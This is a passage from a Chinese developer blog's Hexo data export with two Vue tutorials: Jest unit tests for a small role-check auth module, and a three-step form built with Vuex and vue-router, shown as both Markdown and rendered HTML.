});\n});\n```","slug":"vue-in-action-unitTest","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xu0075wovvp0uxfnkx","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>单元测试在日常开发中可能使用率不高，但是对于功能性的模块，开源的项目就显得非常必要了。Vue CLI 拥有开箱即用的通过 Jest 或 Mocha 进行单元测试的内置选项。本次我们在用 cli 建项目的时候选择了 Jest 方式，因此本文说下在 Vue CLI 构建的项目中 Jest 的使用。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"待测代码\"><a href=\"#待测代码\" class=\"headerlink\" title=\"待测代码\"></a>待测代码</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/auth.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> currentAuth = [<span class=\"string\">\"admin\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123; currentAuth &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCurrentAuthority</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentAuth;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\">authority</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> current = getCurrentAuthority();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> current.some(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> authority.includes(item));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isLogin</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> current = getCurrentAuthority();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> current &amp;&amp; current[<span class=\"number\">0</span>] !== <span class=\"string\">\"guest\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"执行单测命令\"><a href=\"#执行单测命令\" class=\"headerlink\" title=\"执行单测命令\"></a>执行单测命令</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run test:unit -- --watch</span><br></pre></td></tr></table></figure>\n<h2 id=\"编写单测脚本\"><a href=\"#编写单测脚本\" class=\"headerlink\" title=\"编写单测脚本\"></a>编写单测脚本</h2><p>在 tests/unit 下新建文件 auth.spec.js，然后编写脚本，简单的可以参考 example.spec.js 代码，详细的看 Jest<a href=\"https://jestjs.io/docs/en/getting-started\" target=\"_blank\" rel=\"noopener\">官方文档</a>。本次示例代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; check, currentAuth &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"../../src/utils/auth\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// auth测试组</span></span><br><span class=\"line\">describe(<span class=\"string\">\"auth test\"</span>, () =&gt; &#123;</span><br><span class=\"line\">  it(<span class=\"string\">\"empty auth\"</span>, () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 清空currentAuth</span></span><br><span class=\"line\">    currentAuth.splice(<span class=\"number\">0</span>, currentAuth.length);</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"user\"</span>])).toBeFalsy();</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"admin\"</span>])).toBeFalsy();</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  it(<span class=\"string\">\"user auth\"</span>, () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 清空currentAuth</span></span><br><span class=\"line\">    currentAuth.splice(<span class=\"number\">0</span>, currentAuth.length);</span><br><span class=\"line\">    currentAuth.push(<span class=\"string\">\"user\"</span>);</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"user\"</span>])).toBeTruthy();</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"admin\"</span>])).toBeFalsy();</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  it(<span class=\"string\">\"admin auth\"</span>, () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 继续添加admin角色</span></span><br><span class=\"line\">    currentAuth.push(<span class=\"string\">\"admin\"</span>);</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"user\"</span>])).toBeTruthy();</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"admin\"</span>])).toBeTruthy();</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"user\"</span>, <span class=\"string\">\"admin\"</span>])).toBeTruthy();</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>单元测试在日常开发中可能使用率不高，但是对于功能性的模块，开源的项目就显得非常必要了。Vue CLI 拥有开箱即用的通过 Jest 或 Mocha 进行单元测试的内置选项。本次我们在用 cli 建项目的时候选择了 Jest 方式，因此本文说下在 Vue CLI 构建的项目中 Jest 的使用。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"待测代码\"><a href=\"#待测代码\" class=\"headerlink\" title=\"待测代码\"></a>待测代码</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/auth.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> currentAuth = [<span class=\"string\">\"admin\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">export</span> &#123; currentAuth &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCurrentAuthority</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentAuth;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\">authority</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> current = getCurrentAuthority();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> current.some(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> authority.includes(item));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isLogin</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> current = getCurrentAuthority();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> current &amp;&amp; current[<span class=\"number\">0</span>] !== <span class=\"string\">\"guest\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"执行单测命令\"><a href=\"#执行单测命令\" class=\"headerlink\" title=\"执行单测命令\"></a>执行单测命令</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run test:unit -- --watch</span><br></pre></td></tr></table></figure>\n<h2 id=\"编写单测脚本\"><a href=\"#编写单测脚本\" class=\"headerlink\" title=\"编写单测脚本\"></a>编写单测脚本</h2><p>在 tests/unit 下新建文件 auth.spec.js，然后编写脚本，简单的可以参考 example.spec.js 代码，详细的看 Jest<a href=\"https://jestjs.io/docs/en/getting-started\" target=\"_blank\" rel=\"noopener\">官方文档</a>。本次示例代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; check, currentAuth &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"../../src/utils/auth\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// auth测试组</span></span><br><span class=\"line\">describe(<span class=\"string\">\"auth test\"</span>, () =&gt; &#123;</span><br><span class=\"line\">  it(<span class=\"string\">\"empty auth\"</span>, () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 清空currentAuth</span></span><br><span class=\"line\">    currentAuth.splice(<span class=\"number\">0</span>, currentAuth.length);</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"user\"</span>])).toBeFalsy();</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"admin\"</span>])).toBeFalsy();</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  it(<span class=\"string\">\"user auth\"</span>, () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 清空currentAuth</span></span><br><span class=\"line\">    currentAuth.splice(<span class=\"number\">0</span>, currentAuth.length);</span><br><span class=\"line\">    currentAuth.push(<span class=\"string\">\"user\"</span>);</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"user\"</span>])).toBeTruthy();</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"admin\"</span>])).toBeFalsy();</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  it(<span class=\"string\">\"admin auth\"</span>, () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 继续添加admin角色</span></span><br><span class=\"line\">    currentAuth.push(<span class=\"string\">\"admin\"</span>);</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"user\"</span>])).toBeTruthy();</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"admin\"</span>])).toBeTruthy();</span><br><span class=\"line\">    expect(check([<span class=\"string\">\"user\"</span>, <span class=\"string\">\"admin\"</span>])).toBeTruthy();</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>"},{"title":"Vue实战@分步表单","date":"2019-05-24T11:53:26.000Z","updated":"2019-05-24T11:53:26.000Z","_content":"\n# 概述\n\n假如该分步表单有三步，对应组件为 `Step1.vue`，`Step2.vue`，`Step3.vue`，第一步需要填写收款账号，第二步需要填写用户密码，可以回到上一步修改收款账号，可以直接填写密码提交后端接口进行数据可视化，成功后跳到第三步显示成功信息。主要知识点有 vuex 和编程式的导航。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n![效果图](step-form.gif)\n\n<!-- more -->\n\n# 详述\n\n## 创建 store，vuex 相关配置\n\n```js\n// src/store/modules/form.js\nimport router from \"../../router\";\nimport request from \"../../utils/request\";\n\nconst state = {\n  step: {\n    payAccount: \"123456\"\n  }\n};\n\nconst actions = {\n  async submitStepForm({ commit }, payload) {\n    console.log(payload);\n    await request({\n      url: \"/api/form\",\n      method: \"POST\",\n      data: payload\n    });\n    commit(\"saveStepFormData\", payload);\n    router.push(\"/form/step-form/result\");\n  }\n};\n\nconst mutations = {\n  saveStepFormData(state, payload) {\n    state.step = {\n      ...state.step,\n      ...payload\n    };\n  }\n};\n\nexport default {\n  namespaced: true,\n  state,\n  actions,\n  mutations\n};\n```\n\n```js\n// src/store/index.js\n\nimport Vue from \"vue\";\nimport Vuex from \"vuex\";\nimport form from \"./modules/form\";\n\nVue.use(Vuex);\n\nexport default new Vuex.Store({\n  state: {},\n  modules: {\n    form\n  }\n});\n```\n\n## 第一步\n\n调用 vuex 的 `mutations` 的 `saveStepFormData` 方法把数据保存到 `state`，然后路由跳转到第二步页面。\n\n```html\n<!-- Step1.vue -->\n<script>\n  export default {\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $router, $store } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.commit(\"form/saveStepFormData\", values);\n            $router.push(\"/form/step-form/confirm\");\n          }\n        });\n      }\n    }\n  };\n</script>\n```\n\n## 第二步\n\n调用 `actions` 的 `submitStepForm` 方法，异步请求后端接口进行数据持久化，然后更新 `state`，最后路由跳转到成功页。\n\n```html\n<script>\n  export default {\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $store, step } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.dispatch(\"form/submitStepForm\", { ...step, ...values });\n          }\n        });\n      },\n      handlePre() {\n        this.$router.push(\"/form/step-form/info\");\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-stepForm.md","raw":"---\ntitle: Vue实战@分步表单\npermalink: vue-in-action-stepForm\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-24 19:53:26\nupdated: 2019-05-24 19:53:26\n---\n\n# 概述\n\n假如该分步表单有三步，对应组件为 `Step1.vue`，`Step2.vue`，`Step3.vue`，第一步需要填写收款账号，第二步需要填写用户密码，可以回到上一步修改收款账号，可以直接填写密码提交后端接口进行数据可视化，成功后跳到第三步显示成功信息。主要知识点有 vuex 和编程式的导航。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n![效果图](step-form.gif)\n\n<!-- more -->\n\n# 详述\n\n## 创建 store，vuex 相关配置\n\n```js\n// src/store/modules/form.js\nimport router from \"../../router\";\nimport request from \"../../utils/request\";\n\nconst state = {\n  step: {\n    payAccount: \"123456\"\n  }\n};\n\nconst actions = {\n  async submitStepForm({ commit }, payload) {\n    console.log(payload);\n    await request({\n      url: \"/api/form\",\n      method: \"POST\",\n      data: payload\n    });\n    commit(\"saveStepFormData\", payload);\n    router.push(\"/form/step-form/result\");\n  }\n};\n\nconst mutations = {\n  saveStepFormData(state, payload) {\n    state.step = {\n      ...state.step,\n      ...payload\n    };\n  }\n};\n\nexport default {\n  namespaced: true,\n  state,\n  actions,\n  mutations\n};\n```\n\n```js\n// src/store/index.js\n\nimport Vue from \"vue\";\nimport Vuex from \"vuex\";\nimport form from \"./modules/form\";\n\nVue.use(Vuex);\n\nexport default new Vuex.Store({\n  state: {},\n  modules: {\n    form\n  }\n});\n```\n\n## 第一步\n\n调用 vuex 的 `mutations` 的 `saveStepFormData` 方法把数据保存到 `state`，然后路由跳转到第二步页面。\n\n```html\n<!-- Step1.vue -->\n<script>\n  export default {\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $router, $store } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.commit(\"form/saveStepFormData\", values);\n            $router.push(\"/form/step-form/confirm\");\n          }\n        });\n      }\n    }\n  };\n</script>\n```\n\n## 第二步\n\n调用 `actions` 的 `submitStepForm` 方法，异步请求后端接口进行数据持久化，然后更新 `state`，最后路由跳转到成功页。\n\n```html\n<script>\n  export default {\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $store, step } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.dispatch(\"form/submitStepForm\", { ...step, ...values });\n          }\n        });\n      },\n      handlePre() {\n        this.$router.push(\"/form/step-form/info\");\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-stepForm","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xu0077wovvtmu8y1w9","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>假如该分步表单有三步，对应组件为 <code>Step1.vue</code>，<code>Step2.vue</code>，<code>Step3.vue</code>，第一步需要填写收款账号，第二步需要填写用户密码，可以回到上一步修改收款账号，可以直接填写密码提交后端接口进行数据可视化，成功后跳到第三步显示成功信息。主要知识点有 vuex 和编程式的导航。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a><br><img src=\"/vue-in-action-stepForm/step-form.gif\" alt=\"效果图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"创建-store，vuex-相关配置\"><a href=\"#创建-store，vuex-相关配置\" class=\"headerlink\" title=\"创建 store，vuex 相关配置\"></a>创建 store，vuex 相关配置</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/store/modules/form.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> router <span class=\"keyword\">from</span> <span class=\"string\">\"../../router\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> request <span class=\"keyword\">from</span> <span class=\"string\">\"../../utils/request\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> state = &#123;</span><br><span class=\"line\">  step: &#123;</span><br><span class=\"line\">    payAccount: <span class=\"string\">\"123456\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> actions = &#123;</span><br><span class=\"line\">  <span class=\"keyword\">async</span> submitStepForm(&#123; commit &#125;, payload) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(payload);</span><br><span class=\"line\">    <span class=\"keyword\">await</span> request(&#123;</span><br><span class=\"line\">      url: <span class=\"string\">\"/api/form\"</span>,</span><br><span class=\"line\">      method: <span class=\"string\">\"POST\"</span>,</span><br><span class=\"line\">      data: payload</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    commit(<span class=\"string\">\"saveStepFormData\"</span>, payload);</span><br><span class=\"line\">    router.push(<span class=\"string\">\"/form/step-form/result\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> mutations = &#123;</span><br><span class=\"line\">  saveStepFormData(state, payload) &#123;</span><br><span class=\"line\">    state.step = &#123;</span><br><span class=\"line\">      ...state.step,</span><br><span class=\"line\">      ...payload</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  namespaced: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  state,</span><br><span class=\"line\">  actions,</span><br><span class=\"line\">  mutations</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/store/index.js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> Vue <span class=\"keyword\">from</span> <span class=\"string\">\"vue\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> Vuex <span class=\"keyword\">from</span> <span class=\"string\">\"vuex\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> form <span class=\"keyword\">from</span> <span class=\"string\">\"./modules/form\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Vue.use(Vuex);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"keyword\">new</span> Vuex.Store(&#123;</span><br><span class=\"line\">  state: &#123;&#125;,</span><br><span class=\"line\">  modules: &#123;</span><br><span class=\"line\">    form</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>调用 vuex 的 <code>mutations</code> 的 <code>saveStepFormData</code> 方法把数据保存到 <code>state</code>，然后路由跳转到第二步页面。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- Step1.vue --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        formItemLayout: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          labelCol: &#123; span: 4 &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">          wrapperCol: &#123; span: 14 &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">        form: <span class=\"keyword\">this</span>.$form.createForm(<span class=\"keyword\">this</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    computed: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      step() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.$store.state.form.step;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      handleSubmit() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> &#123; form, $router, $store &#125; = <span class=\"keyword\">this</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        form.validateFields(<span class=\"function\">(<span class=\"params\">err, values</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!err) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            $store.commit(<span class=\"string\">\"form/saveStepFormData\"</span>, values);</span></span><br><span class=\"line\"><span class=\"javascript\">            $router.push(<span class=\"string\">\"/form/step-form/confirm\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">          &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>调用 <code>actions</code> 的 <code>submitStepForm</code> 方法，异步请求后端接口进行数据持久化，然后更新 <code>state</code>，最后路由跳转到成功页。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span 